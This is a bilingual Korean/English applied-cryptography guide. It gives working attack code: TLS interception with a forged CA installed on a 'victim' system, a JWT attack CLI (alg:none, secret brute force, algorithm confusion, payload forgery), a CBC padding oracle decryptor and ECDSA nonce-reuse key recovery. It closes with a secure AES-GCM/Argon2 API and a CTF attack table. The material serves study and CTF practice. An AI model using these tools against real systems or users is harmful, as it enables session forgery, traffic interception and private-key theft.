> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 응용 암호학 — 실전 취약점과 방어

## 1. 공개키 인프라 (PKI) 공격

### 인증서 위조 및 중간자 공격

```bash
# mitmproxy를 통한 TLS 인터셉트
mitmproxy --mode transparent --ssl-insecure

# 커스텀 CA 인증서로 트래픽 인터셉트
openssl req -x509 -newkey rsa:4096 -keyout ca.key -out ca.crt -days 365 -nodes \
    -subj "/CN=Fake CA/O=Evil Corp"

# 피해자 시스템에 CA 설치 (사회공학 필요)
# Linux: cp ca.crt /usr/local/share/ca-certificates/ && update-ca-certificates
# Windows: certutil -addstore Root ca.crt
```

### Certificate Transparency 로그 활용

```bash
# crt.sh API로 서브도메인 열거
curl -s "https://crt.sh/?q=%.example.com&output=json" | \
    python3 -c "
import sys, json
for cert in json.load(sys.stdin):
    print(cert.get('name_value', ''))
" | sort -u

# subfinder로 CT 로그 기반 서브도메인 탐색
subfinder -d example.com -all
```

---

## 2. JWT 공격

```python
#!/usr/bin/env python3
"""JWT 취약점 분석 및 공격 CLI."""

import argparse
import base64
import hashlib
import hmac
import json
import sys
from pathlib import Path


def b64url_decode(s: str) -> bytes:
    """Base64URL 패딩 없이 디코딩."""
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)


def b64url_encode(b: bytes) -> str:
    """Base64URL 패딩 없이 인코딩."""
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def decode_jwt(token: str) -> tuple[dict, dict, str]:
    """JWT 디코딩 (서명 검증 없이)."""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("유효하지 않은 JWT 형식")
    header  = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    sig     = parts[2]
    return header, payload, sig


def attack_none_alg(token: str) -> str:
    """alg:none 공격 — 서명 제거."""
    header, payload, _ = decode_jwt(token)
    header["alg"] = "none"
    new_header  = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    new_payload = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{new_header}.{new_payload}."


def attack_empty_sig(token: str) -> str:
    """빈 서명 공격."""
    parts = token.split(".")
    return f"{parts[0]}.{parts[1]}."


def brute_force_secret(token: str, wordlist: Path) -> str | None:
    """HS256 시크릿 브루트포스."""
    _, _, _ = decode_jwt(token)
    parts = token.split(".")
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    expected_sig  = b64url_decode(parts[2])

    with open(wordlist, errors="ignore") as f:
        for line in f:
            secret = line.strip().encode()
            sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
            if sig == expected_sig:
                return line.strip()
    return None


def attack_alg_confusion(token: str, public_key_pem: str) -> str:
    """RSA → HS256 알고리즘 혼동 공격."""
    header, payload, _ = decode_jwt(token)
    header["alg"] = "HS256"
    new_header  = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    new_payload = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{new_header}.{new_payload}".encode()
    sig = hmac.new(public_key_pem.encode(), signing_input, hashlib.sha256).digest()
    return f"{new_header}.{new_payload}.{b64url_encode(sig)}"


def modify_payload(token: str, key: str, value: str, secret: str = "") -> str:
    """페이로드 값 수정 후 재서명 (시크릿 있을 때)."""
    header, payload, _ = decode_jwt(token)
    payload[key] = value
    new_header  = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    new_payload = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())

    if secret and header.get("alg") == "HS256":
        signing_input = f"{new_header}.{new_payload}".encode()
        sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
        return f"{new_header}.{new_payload}.{b64url_encode(sig)}"

    return f"{new_header}.{new_payload}."


def main() -> None:
    parser = argparse.ArgumentParser(description="JWT 취약점 분석 도구")
    sub = parser.add_subparsers(dest="cmd", required=True)

    # decode
    d = sub.add_parser("decode", help="JWT 디코딩 (서명 미검증)")
    d.add_argument("token")

    # none
    n = sub.add_parser("none", help="alg:none 공격")
    n.add_argument("token")

    # brute
    b = sub.add_parser("brute", help="HS256 시크릿 브루트포스")
    b.add_argument("token")
    b.add_argument("--wordlist", type=Path, default=Path("/usr/share/wordlists/rockyou.txt"))

    # confuse
    c = sub.add_parser("confuse", help="RSA→HS256 알고리즘 혼동 공격")
    c.add_argument("token")
    c.add_argument("--pubkey", required=True, type=Path, help="RSA 공개키 PEM 파일")

    # modify
    m = sub.add_parser("modify", help="페이로드 값 수정")
    m.add_argument("token")
    m.add_argument("--key", required=True)
    m.add_argument("--value", required=True)
    m.add_argument("--secret", default="")

    args = parser.parse_args()

    match args.cmd:
        case "decode":
            h, p, s = decode_jwt(args.token)
            print("Header:", json.dumps(h, indent=2))
            print("Payload:", json.dumps(p, indent=2))
            print("Signature:", s)

        case "none":
            print("[+] alg:none 토큰:")
            print(attack_none_alg(args.token))

        case "brute":
            print(f"[*] 워드리스트: {args.wordlist}")
            secret = brute_force_secret(args.token, args.wordlist)
            if secret:
                print(f"[+] 시크릿 발견: {secret}")
            else:
                print("[-] 시크릿 미발견")

        case "confuse":
            pem = args.pubkey.read_text()
            print("[+] 알고리즘 혼동 토큰:")
            print(attack_alg_confusion(args.token, pem))

        case "modify":
            result = modify_payload(args.token, args.key, args.value, args.secret)
            print("[+] 수정된 토큰:")
            print(result)


if __name__ == "__main__":
    main()
```

---

## 3. CBC 패딩 오라클 공격

```python
#!/usr/bin/env python3
"""CBC 패딩 오라클 공격 구현."""

import os
from typing import Callable


def padding_oracle_decrypt(
    ciphertext: bytes,
    block_size: int,
    oracle: Callable[[bytes], bool],
    iv: bytes | None = None,
) -> bytes:
    """
    CBC 패딩 오라클 공격으로 평문 복호화.

    Args:
        ciphertext: 복호화할 암호문 (블록 정렬된)
        block_size: AES 블록 크기 (16)
        oracle: 패딩이 올바르면 True를 반환하는 오라클 함수
        iv: 초기화 벡터 (없으면 첫 블록을 IV로 사용)

    Returns:
        복호화된 평문 바이트
    """
    if iv is None:
        iv = ciphertext[:block_size]
        ciphertext = ciphertext[block_size:]

    blocks = [iv] + [
        ciphertext[i:i+block_size]
        for i in range(0, len(ciphertext), block_size)
    ]

    plaintext = b""

    for block_idx in range(1, len(blocks)):
        prev_block = bytearray(blocks[block_idx - 1])
        curr_block = blocks[block_idx]
        intermediate = bytearray(block_size)

        for byte_pos in range(block_size - 1, -1, -1):
            pad_byte = block_size - byte_pos

            # 이미 알고 있는 바이트들로 패딩 구성
            for k in range(byte_pos + 1, block_size):
                prev_block[k] = intermediate[k] ^ pad_byte

            found = False
            for guess in range(256):
                prev_block[byte_pos] = guess
                test_cipher = bytes(prev_block) + curr_block

                if oracle(test_cipher):
                    # intermediate[byte_pos] = guess ^ pad_byte
                    intermediate[byte_pos] = guess ^ pad_byte
                    found = True
                    break

            if not found:
                raise ValueError(f"오라클 실패: 블록 {block_idx}, 바이트 {byte_pos}")

        # 평문 블록 = intermediate XOR 원래 이전 블록
        plain_block = bytes(
            intermediate[i] ^ blocks[block_idx - 1][i]
            for i in range(block_size)
        )
        plaintext += plain_block

    # PKCS#7 패딩 제거
    pad_len = plaintext[-1]
    if 1 <= pad_len <= block_size:
        plaintext = plaintext[:-pad_len]

    return plaintext


# ─── 로컬 오라클 예시 (테스트용) ───

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad


class LocalOracle:
    def __init__(self, key: bytes) -> None:
        self.key = key

    def encrypt(self, plaintext: bytes) -> tuple[bytes, bytes]:
        iv = os.urandom(16)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        ct = cipher.encrypt(pad(plaintext, 16))
        return iv, ct

    def check_padding(self, iv: bytes, ciphertext: bytes) -> bool:
        """패딩이 올바르면 True 반환."""
        try:
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            unpad(cipher.decrypt(ciphertext), 16)
            return True
        except ValueError:
            return False


if __name__ == "__main__":
    key = os.urandom(16)
    oracle = LocalOracle(key)

    message = b"Secret: admin=true&role=superuser"
    iv, ct = oracle.encrypt(message)

    print(f"[*] 암호화: {ct.hex()}")

    def oracle_fn(data: bytes) -> bool:
        return oracle.check_padding(data[:16], data[16:])

    recovered = padding_oracle_decrypt(ct, 16, oracle_fn, iv)
    print(f"[+] 복호화: {recovered}")
    assert recovered == message
```

---

## 4. ECDSA 논스 재사용 공격

```python
#!/usr/bin/env python3
"""ECDSA 논스 재사용 공격 — 같은 k로 두 서명 시 개인키 복구."""

from dataclasses import dataclass


@dataclass
class ECDSASignature:
    r: int
    s: int
    msg_hash: int


def recover_private_key(
    sig1: ECDSASignature,
    sig2: ECDSASignature,
    curve_order: int,
) -> int | None:
    """
    동일 논스 k 재사용 시 개인키 d 복구.

    수학적 근거:
      s1 = k^-1 (h1 + r*d) mod n
      s2 = k^-1 (h2 + r*d) mod n
      s1 - s2 = k^-1 (h1 - h2) mod n
      k = (h1 - h2) * (s1 - s2)^-1 mod n
      d = (s1*k - h1) * r^-1 mod n
    """
    if sig1.r != sig2.r:
        return None  # 논스가 다름

    n = curve_order
    h1, h2 = sig1.msg_hash, sig2.msg_hash
    s1, s2 = sig1.s, sig2.s

    # k 복구
    k = ((h1 - h2) * pow(s1 - s2, -1, n)) % n

    # 개인키 d 복구
    d = ((s1 * k - h1) * pow(sig1.r, -1, n)) % n

    return d


# secp256k1 곡선 차수 (Bitcoin/Ethereum)
SECP256K1_ORDER = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

if __name__ == "__main__":
    import hashlib

    # 테스트: 같은 k로 두 메시지 서명 (취약 구현 시뮬레이션)
    private_key = 0x1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF
    k = 0xDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF

    n = SECP256K1_ORDER
    h1 = int(hashlib.sha256(b"message 1").hexdigest(), 16)
    h2 = int(hashlib.sha256(b"message 2").hexdigest(), 16)

    # r은 k에만 의존 → 두 서명에서 동일
    # (실제 r 계산은 타원곡선 연산 필요 — 여기서는 임의값 사용)
    r = 0xABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890AB

    s1 = (pow(k, -1, n) * (h1 + r * private_key)) % n
    s2 = (pow(k, -1, n) * (h2 + r * private_key)) % n

    sig1 = ECDSASignature(r=r, s=s1, msg_hash=h1)
    sig2 = ECDSASignature(r=r, s=s2, msg_hash=h2)

    recovered = recover_private_key(sig1, sig2, n)
    print(f"원본 개인키:  {private_key:#066x}")
    print(f"복구된 개인키: {recovered:#066x}")
    assert recovered == private_key
    print("[+] 개인키 복구 성공!")
```

---

## 5. 안전한 암호화 API

```python
#!/usr/bin/env python3
"""안전한 암호화 API — AES-GCM, Argon2id, PBKDF2."""

import os
import secrets
from dataclasses import dataclass


class SecureCrypto:
    """실전에서 사용 가능한 안전한 암호화 구현체."""

    AES_KEY_SIZE    = 32  # AES-256
    GCM_NONCE_SIZE  = 12  # GCM 권장 논스 크기
    GCM_TAG_SIZE    = 16  # GCM 인증 태그

    @staticmethod
    def generate_key() -> bytes:
        """암호학적으로 안전한 256비트 키 생성."""
        return secrets.token_bytes(SecureCrypto.AES_KEY_SIZE)

    @staticmethod
    def encrypt(plaintext: bytes, key: bytes, aad: bytes = b"") -> bytes:
        """
        AES-256-GCM 인증 암호화.

        반환 형식: nonce(12) + tag(16) + ciphertext
        aad: 추가 인증 데이터 (선택적)
        """
        from Crypto.Cipher import AES
        nonce  = os.urandom(SecureCrypto.GCM_NONCE_SIZE)
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        if aad:
            cipher.update(aad)
        ciphertext, tag = cipher.encrypt_and_digest(plaintext)
        return nonce + tag + ciphertext

    @staticmethod
    def decrypt(ciphertext: bytes, key: bytes, aad: bytes = b"") -> bytes:
        """AES-256-GCM 복호화 및 인증 검증."""
        from Crypto.Cipher import AES
        from Crypto.exceptions import MacMismatchError

        nonce = ciphertext[:SecureCrypto.GCM_NONCE_SIZE]
        tag   = ciphertext[SecureCrypto.GCM_NONCE_SIZE:
                             SecureCrypto.GCM_NONCE_SIZE + SecureCrypto.GCM_TAG_SIZE]
        ct    = ciphertext[SecureCrypto.GCM_NONCE_SIZE + SecureCrypto.GCM_TAG_SIZE:]

        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        if aad:
            cipher.update(aad)

        try:
            return cipher.decrypt_and_verify(ct, tag)
        except (ValueError, MacMismatchError) as exc:
            raise ValueError("복호화 실패 — 데이터가 변조되었을 수 있습니다") from exc

    @staticmethod
    def hash_password(password: str) -> str:
        """Argon2id로 패스워드 해시 (권장)."""
        try:
            from argon2 import PasswordHasher
            ph = PasswordHasher(
                time_cost=3,
                memory_cost=65536,  # 64MB
                parallelism=4,
                hash_len=32,
                salt_len=16,
            )
            return ph.hash(password)
        except ImportError:
            # argon2-cffi 미설치 시 PBKDF2 fallback
            import hashlib
            salt = os.urandom(32)
            dk   = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, 600_000)
            return f"pbkdf2:sha256:600000:{salt.hex()}:{dk.hex()}"

    @staticmethod
    def verify_password(password: str, hash_str: str) -> bool:
        """패스워드 해시 검증."""
        if hash_str.startswith("$argon2"):
            from argon2 import PasswordHasher
            from argon2.exceptions import VerifyMismatchError
            ph = PasswordHasher()
            try:
                return ph.verify(hash_str, password)
            except VerifyMismatchError:
                return False
        elif hash_str.startswith("pbkdf2:"):
            import hashlib
            _, _, iters, salt_hex, key_hex = hash_str.split(":")
            salt = bytes.fromhex(salt_hex)
            dk   = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, int(iters))
            return secrets.compare_digest(dk.hex(), key_hex)
        return False


if __name__ == "__main__":
    key   = SecureCrypto.generate_key()
    msg   = b"민감한 데이터"
    enc   = SecureCrypto.encrypt(msg, key, aad=b"context:api_v1")
    dec   = SecureCrypto.decrypt(enc, key, aad=b"context:api_v1")
    assert dec == msg
    print("[+] AES-GCM 암호화/복호화 성공")

    h = SecureCrypto.hash_password("P@ssw0rd!")
    print(f"[+] 패스워드 해시: {h[:40]}...")
    assert SecureCrypto.verify_password("P@ssw0rd!", h)
    print("[+] 패스워드 검증 성공")
```

---

## 6. CTF 암호화 문제 유형 정리

| 유형 | 공격 방법 | 도구 |
|------|-----------|------|
| RSA 작은 지수 (e=3) | Cube root attack | RsaCtfTool |
| RSA 공통 모듈러스 | Common modulus attack | 수동 구현 |
| RSA 위너 공격 | 작은 d → 연분수 전개 | RsaCtfTool |
| CBC 패딩 오라클 | 블록별 바이트 추측 | padbuster |
| ECDSA 논스 재사용 | 선형 방정식으로 k, d 복구 | 수동 구현 |
| XOR 반복 키 | Hamming 거리로 키 길이 추측 | xortool |
| JWT alg:none | 헤더 수정 + 서명 제거 | jwt_tool |
| 해시 길이 확장 | SHA-256 내부 상태 복구 | hashpump |

---

<a name="english"></a>

# Applied Cryptography — Real-World Vulnerabilities and Defense

## 1. Public Key Infrastructure (PKI) Attacks

### Certificate Forgery and Man-in-the-Middle Attacks

```bash
# TLS intercept with mitmproxy
mitmproxy --mode transparent --ssl-insecure

# Intercept traffic with custom CA certificate
openssl req -x509 -newkey rsa:4096 -keyout ca.key -out ca.crt -days 365 -nodes \
    -subj "/CN=Fake CA/O=Evil Corp"

# Install CA on victim system (requires social engineering)
# Linux: cp ca.crt /usr/local/share/ca-certificates/ && update-ca-certificates
# Windows: certutil -addstore Root ca.crt
```

### Certificate Transparency Log Utilization

```bash
# Subdomain enumeration using crt.sh API
curl -s "https://crt.sh/?q=%.example.com&output=json" | \
    python3 -c "
import sys, json
for cert in json.load(sys.stdin):
    print(cert.get('name_value', ''))
" | sort -u

# CT log-based subdomain discovery with subfinder
subfinder -d example.com -all
```

---

## 2. JWT Attacks

```python
#!/usr/bin/env python3
"""JWT vulnerability analysis and attack CLI."""

import argparse
import base64
import hashlib
import hmac
import json
import sys
from pathlib import Path


def b64url_decode(s: str) -> bytes:
    """Decode Base64URL without padding."""
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)


def b64url_encode(b: bytes) -> str:
    """Encode Base64URL without padding."""
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def decode_jwt(token: str) -> tuple[dict, dict, str]:
    """Decode JWT without signature verification."""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Invalid JWT format")
    header  = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    sig     = parts[2]
    return header, payload, sig


def attack_none_alg(token: str) -> str:
    """alg:none attack — remove signature."""
    header, payload, _ = decode_jwt(token)
    header["alg"] = "none"
    new_header  = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    new_payload = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{new_header}.{new_payload}."


def attack_empty_sig(token: str) -> str:
    """Empty signature attack."""
    parts = token.split(".")
    return f"{parts[0]}.{parts[1]}."


def brute_force_secret(token: str, wordlist: Path) -> str | None:
    """Brute-force HS256 secret."""
    _, _, _ = decode_jwt(token)
    parts = token.split(".")
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    expected_sig  = b64url_decode(parts[2])

    with open(wordlist, errors="ignore") as f:
        for line in f:
            secret = line.strip().encode()
            sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
            if sig == expected_sig:
                return line.strip()
    return None


def attack_alg_confusion(token: str, public_key_pem: str) -> str:
    """RSA to HS256 algorithm confusion attack."""
    header, payload, _ = decode_jwt(token)
    header["alg"] = "HS256"
    new_header  = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    new_payload = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{new_header}.{new_payload}".encode()
    sig = hmac.new(public_key_pem.encode(), signing_input, hashlib.sha256).digest()
    return f"{new_header}.{new_payload}.{b64url_encode(sig)}"


def modify_payload(token: str, key: str, value: str, secret: str = "") -> str:
    """Modify payload value and re-sign (when secret is known)."""
    header, payload, _ = decode_jwt(token)
    payload[key] = value
    new_header  = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    new_payload = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())

    if secret and header.get("alg") == "HS256":
        signing_input = f"{new_header}.{new_payload}".encode()
        sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
        return f"{new_header}.{new_payload}.{b64url_encode(sig)}"

    return f"{new_header}.{new_payload}."


def main() -> None:
    parser = argparse.ArgumentParser(description="JWT vulnerability analysis tool")
    sub = parser.add_subparsers(dest="cmd", required=True)

    # decode
    d = sub.add_parser("decode", help="Decode JWT (no signature verification)")
    d.add_argument("token")

    # none
    n = sub.add_parser("none", help="alg:none attack")
    n.add_argument("token")

    # brute
    b = sub.add_parser("brute", help="Brute-force HS256 secret")
    b.add_argument("token")
    b.add_argument("--wordlist", type=Path, default=Path("/usr/share/wordlists/rockyou.txt"))

    # confuse
    c = sub.add_parser("confuse", help="RSA to HS256 algorithm confusion attack")
    c.add_argument("token")
    c.add_argument("--pubkey", required=True, type=Path, help="RSA public key PEM file")

    # modify
    m = sub.add_parser("modify", help="Modify payload value")
    m.add_argument("token")
    m.add_argument("--key", required=True)
    m.add_argument("--value", required=True)
    m.add_argument("--secret", default="")

    args = parser.parse_args()

    match args.cmd:
        case "decode":
            h, p, s = decode_jwt(args.token)
            print("Header:", json.dumps(h, indent=2))
            print("Payload:", json.dumps(p, indent=2))
            print("Signature:", s)

        case "none":
            print("[+] alg:none token:")
            print(attack_none_alg(args.token))

        case "brute":
            print(f"[*] Wordlist: {args.wordlist}")
            secret = brute_force_secret(args.token, args.wordlist)
            if secret:
                print(f"[+] Secret found: {secret}")
            else:
                print("[-] Secret not found")

        case "confuse":
            pem = args.pubkey.read_text()
            print("[+] Algorithm confusion token:")
            print(attack_alg_confusion(args.token, pem))

        case "modify":
            result = modify_payload(args.token, args.key, args.value, args.secret)
            print("[+] Modified token:")
            print(result)


if __name__ == "__main__":
    main()
```

---

## 3. CBC Padding Oracle Attack

```python
#!/usr/bin/env python3
"""CBC padding oracle attack implementation."""

import os
from typing import Callable


def padding_oracle_decrypt(
    ciphertext: bytes,
    block_size: int,
    oracle: Callable[[bytes], bool],
    iv: bytes | None = None,
) -> bytes:
    """
    Decrypt plaintext using CBC padding oracle attack.

    Args:
        ciphertext: Ciphertext to decrypt (block-aligned)
        block_size: AES block size (16)
        oracle: Oracle function returning True for valid padding
        iv: Initialization vector (uses first block if None)

    Returns:
        Decrypted plaintext bytes
    """
    if iv is None:
        iv = ciphertext[:block_size]
        ciphertext = ciphertext[block_size:]

    blocks = [iv] + [
        ciphertext[i:i+block_size]
        for i in range(0, len(ciphertext), block_size)
    ]

    plaintext = b""

    for block_idx in range(1, len(blocks)):
        prev_block = bytearray(blocks[block_idx - 1])
        curr_block = blocks[block_idx]
        intermediate = bytearray(block_size)

        for byte_pos in range(block_size - 1, -1, -1):
            pad_byte = block_size - byte_pos

            # Build padding using already-known bytes
            for k in range(byte_pos + 1, block_size):
                prev_block[k] = intermediate[k] ^ pad_byte

            found = False
            for guess in range(256):
                prev_block[byte_pos] = guess
                test_cipher = bytes(prev_block) + curr_block

                if oracle(test_cipher):
                    # intermediate[byte_pos] = guess ^ pad_byte
                    intermediate[byte_pos] = guess ^ pad_byte
                    found = True
                    break

            if not found:
                raise ValueError(f"Oracle failed: block {block_idx}, byte {byte_pos}")

        # Plaintext block = intermediate XOR original previous block
        plain_block = bytes(
            intermediate[i] ^ blocks[block_idx - 1][i]
            for i in range(block_size)
        )
        plaintext += plain_block

    # Remove PKCS#7 padding
    pad_len = plaintext[-1]
    if 1 <= pad_len <= block_size:
        plaintext = plaintext[:-pad_len]

    return plaintext


# ─── Local oracle example (for testing) ───

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad


class LocalOracle:
    def __init__(self, key: bytes) -> None:
        self.key = key

    def encrypt(self, plaintext: bytes) -> tuple[bytes, bytes]:
        iv = os.urandom(16)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        ct = cipher.encrypt(pad(plaintext, 16))
        return iv, ct

    def check_padding(self, iv: bytes, ciphertext: bytes) -> bool:
        """Returns True if padding is valid."""
        try:
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            unpad(cipher.decrypt(ciphertext), 16)
            return True
        except ValueError:
            return False


if __name__ == "__main__":
    key = os.urandom(16)
    oracle = LocalOracle(key)

    message = b"Secret: admin=true&role=superuser"
    iv, ct = oracle.encrypt(message)

    print(f"[*] Encrypted: {ct.hex()}")

    def oracle_fn(data: bytes) -> bool:
        return oracle.check_padding(data[:16], data[16:])

    recovered = padding_oracle_decrypt(ct, 16, oracle_fn, iv)
    print(f"[+] Decrypted: {recovered}")
    assert recovered == message
```

---

## 4. ECDSA Nonce Reuse Attack

```python
#!/usr/bin/env python3
"""ECDSA nonce reuse attack — recover private key when same k is used twice."""

from dataclasses import dataclass


@dataclass
class ECDSASignature:
    r: int
    s: int
    msg_hash: int


def recover_private_key(
    sig1: ECDSASignature,
    sig2: ECDSASignature,
    curve_order: int,
) -> int | None:
    """
    Recover private key d when the same nonce k is reused.

    Mathematical basis:
      s1 = k^-1 (h1 + r*d) mod n
      s2 = k^-1 (h2 + r*d) mod n
      s1 - s2 = k^-1 (h1 - h2) mod n
      k = (h1 - h2) * (s1 - s2)^-1 mod n
      d = (s1*k - h1) * r^-1 mod n
    """
    if sig1.r != sig2.r:
        return None  # Different nonces

    n = curve_order
    h1, h2 = sig1.msg_hash, sig2.msg_hash
    s1, s2 = sig1.s, sig2.s

    # Recover k
    k = ((h1 - h2) * pow(s1 - s2, -1, n)) % n

    # Recover private key d
    d = ((s1 * k - h1) * pow(sig1.r, -1, n)) % n

    return d


# secp256k1 curve order (Bitcoin/Ethereum)
SECP256K1_ORDER = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

if __name__ == "__main__":
    import hashlib

    # Test: sign two messages with the same k (simulating vulnerable implementation)
    private_key = 0x1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF
    k = 0xDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF

    n = SECP256K1_ORDER
    h1 = int(hashlib.sha256(b"message 1").hexdigest(), 16)
    h2 = int(hashlib.sha256(b"message 2").hexdigest(), 16)

    # r depends only on k → same in both signatures
    # (actual r computation requires elliptic curve operations — using arbitrary value here)
    r = 0xABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890AB

    s1 = (pow(k, -1, n) * (h1 + r * private_key)) % n
    s2 = (pow(k, -1, n) * (h2 + r * private_key)) % n

    sig1 = ECDSASignature(r=r, s=s1, msg_hash=h1)
    sig2 = ECDSASignature(r=r, s=s2, msg_hash=h2)

    recovered = recover_private_key(sig1, sig2, n)
    print(f"Original private key:  {private_key:#066x}")
    print(f"Recovered private key: {recovered:#066x}")
    assert recovered == private_key
    print("[+] Private key recovery successful!")
```

---

## 5. Secure Cryptography API

```python
#!/usr/bin/env python3
"""Secure cryptography API — AES-GCM, Argon2id, PBKDF2."""

import os
import secrets
from dataclasses import dataclass


class SecureCrypto:
    """Production-ready secure cryptography implementation."""

    AES_KEY_SIZE    = 32  # AES-256
    GCM_NONCE_SIZE  = 12  # Recommended GCM nonce size
    GCM_TAG_SIZE    = 16  # GCM authentication tag

    @staticmethod
    def generate_key() -> bytes:
        """Generate a cryptographically secure 256-bit key."""
        return secrets.token_bytes(SecureCrypto.AES_KEY_SIZE)

    @staticmethod
    def encrypt(plaintext: bytes, key: bytes, aad: bytes = b"") -> bytes:
        """
        AES-256-GCM authenticated encryption.

        Return format: nonce(12) + tag(16) + ciphertext
        aad: Additional authenticated data (optional)
        """
        from Crypto.Cipher import AES
        nonce  = os.urandom(SecureCrypto.GCM_NONCE_SIZE)
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        if aad:
            cipher.update(aad)
        ciphertext, tag = cipher.encrypt_and_digest(plaintext)
        return nonce + tag + ciphertext

    @staticmethod
    def decrypt(ciphertext: bytes, key: bytes, aad: bytes = b"") -> bytes:
        """AES-256-GCM decryption and authentication verification."""
        from Crypto.Cipher import AES
        from Crypto.exceptions import MacMismatchError

        nonce = ciphertext[:SecureCrypto.GCM_NONCE_SIZE]
        tag   = ciphertext[SecureCrypto.GCM_NONCE_SIZE:
                             SecureCrypto.GCM_NONCE_SIZE + SecureCrypto.GCM_TAG_SIZE]
        ct    = ciphertext[SecureCrypto.GCM_NONCE_SIZE + SecureCrypto.GCM_TAG_SIZE:]

        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        if aad:
            cipher.update(aad)

        try:
            return cipher.decrypt_and_verify(ct, tag)
        except (ValueError, MacMismatchError) as exc:
            raise ValueError("Decryption failed — data may have been tampered with") from exc

    @staticmethod
    def hash_password(password: str) -> str:
        """Hash password with Argon2id (recommended)."""
        try:
            from argon2 import PasswordHasher
            ph = PasswordHasher(
                time_cost=3,
                memory_cost=65536,  # 64MB
                parallelism=4,
                hash_len=32,
                salt_len=16,
            )
            return ph.hash(password)
        except ImportError:
            # Fallback to PBKDF2 if argon2-cffi not installed
            import hashlib
            salt = os.urandom(32)
            dk   = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, 600_000)
            return f"pbkdf2:sha256:600000:{salt.hex()}:{dk.hex()}"

    @staticmethod
    def verify_password(password: str, hash_str: str) -> bool:
        """Verify password hash."""
        if hash_str.startswith("$argon2"):
            from argon2 import PasswordHasher
            from argon2.exceptions import VerifyMismatchError
            ph = PasswordHasher()
            try:
                return ph.verify(hash_str, password)
            except VerifyMismatchError:
                return False
        elif hash_str.startswith("pbkdf2:"):
            import hashlib
            _, _, iters, salt_hex, key_hex = hash_str.split(":")
            salt = bytes.fromhex(salt_hex)
            dk   = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, int(iters))
            return secrets.compare_digest(dk.hex(), key_hex)
        return False


if __name__ == "__main__":
    key   = SecureCrypto.generate_key()
    msg   = b"Sensitive data"
    enc   = SecureCrypto.encrypt(msg, key, aad=b"context:api_v1")
    dec   = SecureCrypto.decrypt(enc, key, aad=b"context:api_v1")
    assert dec == msg
    print("[+] AES-GCM encryption/decryption successful")

    h = SecureCrypto.hash_password("P@ssw0rd!")
    print(f"[+] Password hash: {h[:40]}...")
    assert SecureCrypto.verify_password("P@ssw0rd!", h)
    print("[+] Password verification successful")
```

---

## 6. CTF Cryptography Problem Types

| Type | Attack Method | Tool |
|------|---------------|------|
| RSA small exponent (e=3) | Cube root attack | RsaCtfTool |
| RSA common modulus | Common modulus attack | Manual implementation |
| RSA Wiener attack | Small d → continued fraction expansion | RsaCtfTool |
| CBC padding oracle | Byte-by-byte block guessing | padbuster |
| ECDSA nonce reuse | Linear equation to recover k, d | Manual implementation |
| XOR repeating key | Hamming distance for key length guess | xortool |
| JWT alg:none | Modify header + remove signature | jwt_tool |
| Hash length extension | Recover SHA-256 internal state | hashpump |
